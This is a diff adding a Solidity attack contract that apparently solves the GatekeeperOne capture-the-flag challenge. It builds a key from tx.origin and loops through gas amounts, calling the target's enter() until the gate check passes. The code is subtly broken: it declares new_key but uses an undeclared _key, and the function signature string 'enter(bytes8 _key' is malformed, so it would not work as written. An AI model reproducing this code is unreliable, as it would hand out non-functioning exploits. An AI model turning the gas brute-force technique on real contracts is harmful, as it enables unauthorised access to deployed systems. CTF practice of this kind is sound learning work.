@@ -1,0 +1,35 @@
+contract GateOpen{
+
+    address public owner;
+    bool public result;
+    bytes8 public new_key;
+    uint public gas_val;
+    GatekeeperOne public G;
+
+    constructor() public{
+        owner = msg.sender;
+        _key = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);
+    }
+
+    function setGatekeeper(address _addr) public{
+
+        G = GatekeeperOne(_addr);
+    }
+
+    function letMeIn() public{
+
+        // bytes8 _key = 0x38821C2600002148;
+
+        for (uint256 i = 0; i < 120; i++) {
+            (result, ) = address(G).call.gas(i + 150 + 8191 * 3)(abi.encodeWithSignature("enter(bytes8 _key", _key));
+
+            if (result) {
+                gas_val = i + 150 + 8191 * 3;
+                break;
+            }
+        }
+
+        // (result, ) = address(G).call.gas(gas_val)(abi.encodeWithSignature("enter(bytes8 _key", _key));
+
+    }
+
